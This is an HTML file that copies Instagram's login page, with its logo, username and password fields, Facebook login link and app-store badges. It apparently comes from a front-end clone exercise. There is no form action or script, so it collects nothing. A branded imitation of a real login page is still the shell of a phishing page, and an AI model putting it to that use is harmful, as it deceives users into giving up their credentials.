<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="instagram.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>
<body>
    <div class="main">
        <form id="instaform">
            <div class="box">
             <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram"><br>
            <input type="text" placeholder="phone number,username,or email" id="username"><br>
            <input type="text" placeholder="Password" id="password"><br>
            <input type="submit" id="but" value="Log in">
            <div class="or">
                <div class="line"></div>
                <h6>OR</h6>
                <div class="line"></div>
            </div>
            <div class="lfb">
                <div class="fb">
                    <i class="fa fa-facebook-f" style="color: white;"></i>
                </div>
                <a href="#" class="f_log">Log in with Facebook</a>
            </div>
            <a href="#" class="for">Forgot password?</a>
            </div>
            
        </form>
        <div class="do_box">
            <p class="text">Don't have an account?<a href="#" class="sign">Sign up</a></p>
          </div> 

            <p class="get">Get the app.</p>
            <div class="app-img">
              <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
                <img class="img"  src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" >
              </a>
              <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
                <img class="img" src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png">
              </a>  
            </div> 
    </div>

</body>
</html>
